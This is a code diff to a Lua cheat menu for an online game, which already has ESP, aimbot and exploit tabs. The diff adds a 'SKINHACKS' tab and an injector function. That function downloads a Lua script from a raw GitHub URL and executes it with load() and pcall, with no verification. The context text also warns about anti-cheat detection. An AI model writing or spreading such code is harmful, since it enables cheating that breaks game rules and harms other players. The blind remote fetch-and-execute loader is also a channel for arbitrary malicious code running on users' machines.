@@ -45,7 +45,7 @@ local Colors = {
     shadow      = FLinearColor(0.00, 0.00, 0.00, 0.45),
 }
 
-local MENU_W = 800
+local MENU_W = 900
 local MENU_H = 720
 local ROW_H  = 38
 local PAIR_H = 28
@@ -2120,6 +2120,26 @@ local function RenderContent()
 
         Text(contentContainer, "   Работает только пешком (в машине авто-отключается).", 16, y+4, 10, Colors.text_dim, 15, 0.0, 0.0); y = y + 22
         Text(contentContainer, "   Multiplier >15 может быть заметно для античита.", 16, y+4, 10, Colors.text_dim, 15, 0.0, 0.0); y = y + 22
+
+        elseif currentTab == "SKINHACKS" then
+        y = startY
+        Text(contentContainer, "▼ SKIN UNLOCK", 16, y+6, 11, Colors.accent_blue, 15, 0.0, 0.0); y = y + 22
+
+        -- Большая кнопка (визуально как чекбокс, но с действием)
+        local btnW = colW
+        local btnH = 56
+        Layer(contentContainer, 16, y, btnW, btnH, Colors.bg_row, 10)
+        Layer(contentContainer, 16, y + btnH - 1, btnW, 1, FLinearColor(0.2,0.25,0.35,0.4), 11)
+
+        Text(contentContainer, "UNLOCK ALL SKIN", 32, y + btnH * 0.5, 15, Colors.accent_blue, 15, 0.0, 0.5)
+        MakeBtn(contentContainer, 16, y, btnW, btnH, 20, function()
+            _G.InjectSkinLua()
+        end)
+
+        y = y + btnH + 10
+
+        Text(contentContainer, "Нажми кнопку, скрипт скачается и выполнится.", 16, y+4, 10, Colors.text_dim, 15, 0.0, 0.0); y = y + 20
+        Text(contentContainer, "После инжекта зайди в лобби — скины применятся.", 16, y+4, 10, Colors.text_dim, 15, 0.0, 0.0); y = y + 20
     end
 end
 
@@ -2163,6 +2183,7 @@ local function BuildMenu(canvas)
     MakeTab("ESP", "ESP", tabW+8)
     MakeTab("AIMBOT", "AIMBOT", (tabW+8)*2)
     MakeTab("EXPLOIT", "EXPLOIT", (tabW+8)*3)
+    MakeTab("SKINHACKS", "SKINHACKS", (tabW+8)*4)
 
     contentContainer = NewObject("/Script/UMG.CanvasPanel", bgPanel)
     local cSlot = bgPanel:AddChildToCanvas(contentContainer)
@@ -2318,6 +2339,51 @@ local function UpdateWallhack(localPlayer)
             end
         end
     end)
+end
+
+-- ==============================================================================
+-- SKIN HACKS: remote lua injector
+-- ==============================================================================
+local SKIN_LUA_URL = "https://raw.githubusercontent.com/kholoudbendriss/archive/refs/heads/main/skin.lua"
+local _skinInjectBusy = false
+local _skinInjected = false
+
+_G.InjectSkinLua = function()
+    if _skinInjectBusy then return end
+    if _skinInjected then return end
+    _skinInjectBusy = true
+
+    local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
+    if not http then
+        Notify("HTTP manager not available")
+        _skinInjectBusy = false
+        return
+    end
+
+    local headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }
+
+    http:Post(SKIN_LUA_URL, headers, "", nil, function(success, resp)
+        _skinInjectBusy = false
+
+        if not success or not resp or #resp < 50 then
+            Notify("Skin download failed")
+            return
+        end
+
+        local chunk, loadErr = load(resp, "skin.lua")
+        if not chunk then
+            Notify("Skin load error: " .. tostring(loadErr))
+            return
+        end
+
+        local ok, execErr = pcall(chunk)
+        if ok then
+            _skinInjected = true
+            -- skin.lua сам покажет свой попап — дублирующее сообщение не нужно
+        else
+            Notify("Skin exec error: " .. tostring(execErr))
+        end
+    end, 10)
 end
 
 -- ==============================================================================
